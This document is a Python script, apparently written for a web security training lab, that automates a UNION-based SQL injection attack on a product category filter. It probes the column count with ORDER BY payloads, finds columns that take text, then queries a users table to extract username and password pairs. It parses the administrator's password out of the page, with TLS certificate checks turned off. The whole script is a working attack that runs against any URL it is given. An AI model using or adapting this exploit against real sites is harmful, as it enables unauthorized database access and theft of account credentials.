import requests 
import sys
import urllib3
import re 
from bs4 import BeautifulSoup as bs 
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
s=requests.Session()
path= "/filter?category=Gifts" #### Change the path according to your lab 
def find_colum(s,url):
        for i in range (1, 30):
            payload=f"'order by {i} -- "
            r=s.get(url+path+payload,verify=False)
            if "Internal Server Error" in r.text:
                i=i-1
                return i
        return 0
    
def find_sting_col(s,url,num_col):
    found_col=[]
    string= "anything1"
    for i in range (1,num_col+1):
        list=["null"]*num_col
        list[i - 1] = f"'{string}'"
        payload=f"'union select {','.join(list)} -- "
        r=s.get(url+path+payload,verify=False)
        
        if string.strip('\'') in r.text:
            found_col.append(i)
    return found_col
        
        
def sql_exploit(s,url):
    username="administrator"
    payload=f"'union select null, username|| ':' || password from users -- " 
    r=s.get(url+path+payload,verify=False)
    if username in r.text:
        print(f"Found the user_name and passwor for administrtor ")
        soup=bs(r.text ,'html.parser')
        admin_password=soup.find(string=re.compile('.*administrator.*')).split(':')[1]
        return admin_password
    else:
        return False
              
        
if __name__=="__main__":
    try:
        url=input("Please enter base url  : ")
        
        if not url:
            raise ValueError("Please enter proper input : ")
        
        num_col=find_colum(s,url)
        if num_col >0:
            print(f" found number of column is : {num_col}")
        else:
            print(f"Did not found any column ")
            
        string_column=find_sting_col(s,url,num_col)
        if string_column:
            print(f"found the column which supports string or text value {string_column}")
        else:
            print(f"did not find any column which contains string ")
        
        password=sql_exploit(s,url)
        if password:
            print(f"Passwor for administrator user is {password}")
            
        else:
            print(f"Password did not found ")
    except ValueError as e :
        print(e)
        